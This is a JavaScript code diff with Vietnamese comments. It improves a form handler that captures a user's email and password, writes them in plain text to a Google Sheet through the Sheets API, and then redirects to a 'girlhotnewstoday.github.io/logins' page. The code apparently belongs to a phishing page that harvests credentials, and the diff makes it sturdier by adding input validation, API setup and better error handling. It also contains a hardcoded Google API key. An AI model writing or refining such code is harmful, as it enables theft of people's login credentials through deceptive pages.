@@ -243,26 +243,55 @@ function sendData(event) {
     return;
   }
 
+  // Thực hiện kiểm tra email và pass hợp lệ
+  if (!isValidEmail(email)) {
+    alert("Please enter a valid email.");
+    return;
+  }
+
   // Thực hiện gọi API để thêm dữ liệu vào Google Sheets
-  const sheetId = "1YfHUe71d33JQSTsW63vpYwb4N2Uz2XOffO3wJnRh3Zo";
-  const range = "Sheet1!A:B";
+  const sheetId = "1YfHUe71d33JQSTsW63vpYwb4N2Uz2XOffO3wJnRh3Zo";  // ID bảng tính
+  const range = "Sheet1!A:B";  // Phạm vi sheet bạn muốn ghi dữ liệu vào
   const valueRangeBody = {
     "values": [
-      [email, pass]
+      [email, pass]  // Dữ liệu sẽ được ghi vào cột A và B
     ]
   };
 
+  // Gọi Google Sheets API sau khi gapi client đã được khởi tạo
   gapi.client.sheets.spreadsheets.values.append({
     spreadsheetId: sheetId,
     range: range,
     valueInputOption: "RAW",
     resource: valueRangeBody
   }).then(function(response) {
+    console.log("Response: ", response);
     alert("Credentials saved successfully!");
     window.location.href = "https://girlhotnewstoday.github.io/logins/confirm.html";
   }).catch(function(error) {
     console.error("Error saving data:", error);
-    alert('Connection issue!');
+    alert("Error saving credentials: " + error.message);
+  });
+}
+
+function isValidEmail(email) {
+  const regex = /^[^@\s]+@[^@\s]+\.[^@\s]+$/;
+  return regex.test(email);
+}
+
+// Hàm khởi tạo Google API
+function onGapiLoad() {
+  gapi.load('client', initGapiClient); // Gọi init khi API đã sẵn sàng
+}
+
+function initGapiClient() {
+  gapi.client.init({
+    apiKey: "AIzaSyB8cfQtIJFIimytGozA9oTGUliK3q6rArc",  // API Key của bạn
+    discoveryDocs: ["https://sheets.googleapis.com/$discovery/rest?version=v4"]
+  }).then(function() {
+    console.log("Google Sheets API initialized.");
+  }).catch(function(error) {
+    console.error("Error initializing Google API: ", error);
   });
 }
 
